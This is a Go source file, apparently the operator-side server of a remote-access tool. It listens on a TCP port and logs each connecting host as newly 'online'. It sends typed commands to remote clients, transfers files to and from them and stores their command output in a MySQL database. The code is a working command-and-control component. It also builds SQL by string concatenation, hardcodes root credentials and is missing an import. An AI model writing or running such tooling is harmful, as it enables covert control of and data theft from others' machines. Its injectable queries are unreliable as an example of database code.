package main

import (
	"bufio"
	"crypto/tls"
	"crypto/x509"
	"database/sql"
	"fmt"
	_ "github.com/go-sql-driver/mysql"
	"io"
	"io/ioutil"
	"mahonia"
	"net"
	"os"
	"runtime"
	"strings"
	"sync"
	"time"
)

var listener net.Listener
var db *sql.DB //声明一个全局的db变量
var conn net.Conn
var  wg sync.WaitGroup
var informant =make(map[int]string)
// InitMysql 初始化数据库和尝试连接数据库
func InitMysql() (err error) {
	innodb := "root:root@tcp(127.0.0.1:3306)/select_information"
	db, err = sql.Open("mysql", innodb)
	if err != nil {
		return
	}
	err = db.Ping()
	if err != nil {
		return
	}
	return
}

// InsertNewDemo 实现对数据表执行增删改查的功能
func InsertNewDemo() {
	for {
		fmt.Print("请选择insert,delete,update,select:")
		instructed := bufio.NewReader(os.Stdin)
		n, _ := instructed.ReadString('\n')
		instructs := strings.Trim(n, "\r\n")
		if instructs=="insert" {
			_, err := db.Exec("INSERT INTO result(host_ip,information1,information2,information3)" + "values ('" + informant[1] + "','" + informant[2] + "','" + informant[3] + "','" + informant[4] + "')")
			if err != nil {
				fmt.Print("insert information err:", err)
			} else {
				fmt.Print("insert information success!\n")
			}
		}else if instructs=="delete" {
			fmt.Print("请输入要删除的行的host_ip:")
			function:= bufio.NewReader(os.Stdin)
			j,_:=function.ReadString('\n')
			functor :=strings.Trim(j,"\r\n")
			_,err1:=db.Exec("DELETE FROM result where host_ip="+"'"+ functor +"'")
			if  err1!= nil {
				fmt.Print("delete information err:",err1,"\n")
			}else {
				fmt.Print("delete success!")
			}
		}else if instructs=="update" {
			fmt.Print("请输入需要修改数据的host_ip:")
			update:= bufio.NewReader(os.Stdin)
			l,_:=update.ReadString('\n')
			updates :=strings.Trim(l,"\r\n")
			fmt.Print("请输入需要修改的数据所在的列：","\n")
			column:= bufio.NewReader(os.Stdin)
			k,_:=column.ReadString('\n')
			columns:=strings.Trim(k,"\r\n")
			fmt.Print("请输入修改后的数据：","\n")
			AfterInformation := bufio.NewReader(os.Stdin)
			a,_:=AfterInformation.ReadString('\n')
			After:=strings.Trim(a,"\r\n")
			_,err2:=db.Exec("UPDATE result SET " + "`" + columns + "` = " + " '" + After + "' WHERE host_ip = " + "'"+ updates +"'")
			if err2 != nil {
				fmt.Print("update information err:",err2)
			}else {
				fmt.Print("update success!\n")
			}
		}else if instructs=="select" {
			fmt.Print("请输入要查询的host_ip:\n")
			selection:=bufio.NewReader(os.Stdin)
			h,_:=selection.ReadString('\n')
			selections:=strings.Trim(h,"\r\n")
			var HostIp,information1,information2,information3 string
			rows:=db.QueryRow("select * from result where host_ip="+"'"+selections+"'")   //获取一行数据
			_=rows.Scan(&HostIp,&information1,&information2,&information3)        //将rows中的数据存到4个变量里面中
			fmt.Println(HostIp,"--",information1,"--",information2,"--",information3)
		} else {
			fmt.Print("请重新选择操作！\n")
		}
		fmt.Print("是否返回cmd命令?(yes or no)")
		instruction := bufio.NewReader(os.Stdin)
		m, _ := instruction.ReadString('\n')
		instruct := strings.Trim(m, "\r\n")
		if instruct=="yes" {
			//清空字典
			delete(informant,2)
			delete(informant,3)
			delete(informant,4)
			return
		}
	}
}

//主函数
func main() {
	addr := "0.0.0.0:4344"
	//监听本机端口
	listener, _ = net.Listen("tcp", addr) //tls.Listen("tcp", addr,encryption())
	//net.Listen("tcp", "10.0.16.14:4445")
	listeners()

}

//等待客户端连接
func listeners() {

	fmt.Println("listen success!")
	//等待连接
	for {
		wg.Add(1)
		fmt.Println("waiting connection!")
		conn, _ = listener.Accept() //没有收到连接请求就一直堵塞
		fmt.Println("叮，您有新的主机上线啦！")
		fmt.Print("主机ip为：", conn.RemoteAddr(), "\n")
		informant[1]=conn.RemoteAddr().String()
		fmt.Print("ip存储成功！","\n")
		fmt.Print("开始通信的时间为：", time.Now().Format("2006-01-02 15:04:05"))
		fmt.Print("\n")
		go selection() //接收数据返回接受无误 进入下一个函数选择需要做的操作
		wg.Wait()
	}
}

//选择操作(上传下载文件，执行cmd命令，开启心跳功能)
func selection() {
	for {
		//downfile向远程主机传输文件
		fmt.Print("downfile,向远程主机传输文件；\n")
		//upfile从远程主机下载文件
		fmt.Print("upfile,从远程主机下载文件；\n")
		//cmd执行cmd命令
		fmt.Print("cmd,执行其他命令；\n")
		fmt.Print("heartbeat,开启心跳功能；\n")
		fmt.Print("shutdown,关闭client程序；\n")
		fmt.Print("quit,退出连接！\n")
		fmt.Println("请输入要执行的操作：")
		input := bufio.NewReader(os.Stdin)
		s, _ := input.ReadString('\n')
		s = strings.Trim(s, "\r\n")
		if s == "downfile" {
			_, _ = conn.Write([]byte(s))
			SendFile()
		} else if s == "upfile" {
			_, _ = conn.Write([]byte(s))
			ReceiveFile()
		} else if s == "cmd" {
			_, _ = conn.Write([]byte(s))
			process()
		} else if s == "quit" {
			//删除ip
			delete(informant,1)
			//向客户端发送断开连接的消息
			buf:=make([]byte,4096)
			_,_=conn.Write([]byte(s))
			n,_:=conn.Read(buf)
			fmt.Print(string(buf[:n]),"\n")
			i:=string(buf[:n])
			i=strings.Trim(i,"\r\n")
			if i=="ok" {
				fmt.Print("关闭客户端程序成功！","\n")
				wg.Done()
				runtime.Goexit()
			}
		} else if s == "heartbeat" {
			go keepAlive()
			fmt.Print("心跳功能开启成功！\n")
			wg.Wait()
			_=conn.Close()
			runtime.Goexit()
		}else {
			fmt.Print("请重新输入需要执行的操作！\n")
		}

	}
}

//从客户端读取执行cmd命令返回的结果
func process() {
	i:=2
	//连接数据库
	err := InitMysql()
	if err != nil {
		fmt.Print("数据库连接失败：", err,"\n")
	} else {
		fmt.Print("数据库连接成功！\n")
	}
	defer db.Close()
	for {
		//向客户端发送指令
		fmt.Print("请输入指令：\n")
		input := bufio.NewReader(os.Stdin)
		s, _ := input.ReadString('\n')
		s = strings.Trim(s, "\r\n")
		//判断是否退出该函数
		if s == "quit" {
			return
		}
		_, err1 := conn.Write([]byte(s))
		if err1 != nil {
			fmt.Print("Write Error:", err1,"\n")
		}
		//获取客户端返回的结果
		reader := bufio.NewReader(conn) //读取conn中的对象
		var buf = [512]byte{}
		n, err := reader.Read(buf[:]) //使用reader中read方法读取数据
		if err != nil {
			fmt.Print("read from conn failed,err:", err,"\n")
		}
		rec := string(buf[:n])
		rec = ConvertToString(rec, "gbk", "utf-8")
		fmt.Print("客户端传过来的结果为：\n", rec,"\n")
		fmt.Print("是否将结果存储进数据库?(yes or no)\n")
		m := bufio.NewReader(os.Stdin)
		result, err4 := m.ReadString('\n')
		finally := strings.Trim(result, "\r\n")
		if err4 != nil {
			fmt.Print("(yes or no err):", err4)
		}
		if finally == "yes" {
			informant[i]=rec
			fmt.Print("数据已经存入字典啦，还差",4-i,"条数据就可以存进数据库啦！","\n")
			if i==4 {
				fmt.Print("将数据插入数据库！","\n")
				i=1
				InsertNewDemo()
			}
			i++
		}
	}
}

// ConvertToString 转换编码
func ConvertToString(src string, srcCode string, tagCode string) string {
	srcCoder := mahonia.NewDecoder(srcCode)
	srcResult := srcCoder.ConvertString(src)
	tagCoder := mahonia.NewDecoder(tagCode)
	_, cdata, _ := tagCoder.Translate([]byte(srcResult), true)
	result := string(cdata)
	return result
}

//实现监测客户端存活功能
func keepAlive() {
	buf := make([]byte, 4096)
	var i = 0
	for {
		//空闲时间10秒
		time.Sleep(10 * time.Second)
		for {
			_, err1 := conn.Read(buf)
			if err1 != nil {
				//重连间隔5秒
				time.Sleep(5 * time.Second)
				i += 1
			}
			//重连次数为3
			if i == 3 {
				fmt.Print("啊偶，主机掉线啦！\n")
				wg.Done()
				//退出该协程
				runtime.Goexit()
			}
		}
	}
}

//实现通信加密
func encryption() *tls.Config {
	//通过私钥和证书得到crt变量
	crt, err := tls.LoadX509KeyPair("server.pem", "server.key")
	if err != nil {
		fmt.Println("err:", err)
		return nil
	}
	//从client.pem读取内容并将其赋值给certbytes变量
	certBytes, err1 := ioutil.ReadFile("client.pem")
	if err1 != nil {
		fmt.Println("Unable to read cert.pem")
		return nil
	}
	//定义clientCertPool为一个空的certpool结构体
	clientCertPool := x509.NewCertPool()
	//调用clientCertPool的AppendCertsFromPEM方法来判断client.pem证书是否有效
	ok := clientCertPool.AppendCertsFromPEM(certBytes)
	if !ok {
		fmt.Println("failed to parse root certificate")
		return nil
	}
	//生成tls.Config对象
	config := &tls.Config{
		//证书crt
		Certificates: []tls.Certificate{crt},
		//验证客户端
		ClientAuth: tls.RequestClientCert,
		ClientCAs:  clientCertPool,
	}
	return config
}

// ReceiveFile 从客户端下载文件
func ReceiveFile() {
	fmt.Print("请输入文件在主机的路径：\n")
	instruction := bufio.NewReader(os.Stdin)
	m, _ := instruction.ReadString('\n')
	_, err0 := conn.Write([]byte(m))
	if err0 != nil {
		fmt.Print("transact filepath err:", err0)
	}
	buf := make([]byte, 4096)
	n, err := conn.Read(buf)
	if err != nil {
		fmt.Println("conn.Read err:", err)
		return
	}
	filename := string(buf[:n])
	fmt.Println("filename:", filename)
	if filename != "" {
		fmt.Print("接收到了文件名啦！\n")
	} else {
		return
	}
	/**
	  创建文件并写入文件内容
	*/
	fmt.Println(filename)
	file, err := os.Create(filename)
	if err != nil {
		fmt.Println("os.Create err:", err)
		return
	}

	for {
		fmt.Print("开始下载文件！\n")
		n, err := conn.Read(buf)
		if err != nil {
				fmt.Println("conn.Read err:", err)
				return
		}
		s := string(buf[:n])
		s = strings.Trim(s, "\r\n")
		fmt.Print(s + "\n")
		if s =="0"  {
			fmt.Print("传输完成！\n")
			_ = file.Close()
			return
		}
		_, _ = file.Write(buf[:n])
	}
}

// SendFile 向客户端上传文件
func SendFile() {
	fmt.Print("请输入文件在主机的路径：\n")
	instruction := bufio.NewReader(os.Stdin)
	m, _ := instruction.ReadString('\n')
	FilePath := strings.Trim(m, "\r\n")
	//查看文件属性
	FileInfo, err1 := os.Stat(FilePath)
	if err1 != nil {
		fmt.Print("os.stat err:", err1)
		return
	}
	//得到文件大小
	FileConTan := FileInfo.Size()
	fmt.Print(FileConTan, "\n")
	fmt.Print("开始传输\n")
	//得到文件名
	FileName := FileInfo.Name()
	//得到文件大小
	FileCon := strconv.FormatInt(FileConTan, 10)
	////发送文件大小给远程主机
	_, _ = conn.Write([]byte(FileCon))
	//发送文件名大小，文件名到远程主机
	_, err2 := conn.Write([]byte(FileName))
	if err2 != nil {
		fmt.Println("conn.write err:", err2)
		return
	}
	time.Sleep(1 * time.Second)
	fmt.Print("开始读取文件内容！")
	//打开目标文件
	file, err4 := os.Open(FilePath)
	if err4 != nil {
		fmt.Print("os.open err:", err4)
		return
	}
	translation := make([]byte, 4096)
	//循环传输文件
	for {
		//从文件中读取数据
		fmt.Print("111\n")
		ReadLength, err5 := file.Read(translation)
		if err5 != nil {
			//判断是否读完了
			if err5 == io.EOF {
				fmt.Print("文件读取完成！\n")
				_, err := conn.Write([]byte("yes"))
				fmt.Print("空字节发送完成！")
				if err != nil {
					fmt.Print("nil err:", err)
				}
				_ = file.Close()
				return
			}
		}
		//向远程主机发送数据
		fmt.Print("开始传输数据！\n")
		_, err6 := conn.Write(translation[:ReadLength])
		if err6 != nil {
			fmt.Print("conn write err:", err6)
			return
		}
		fmt.Print("休息一秒！\n")
		time.Sleep(1 * time.Second)
	}
}
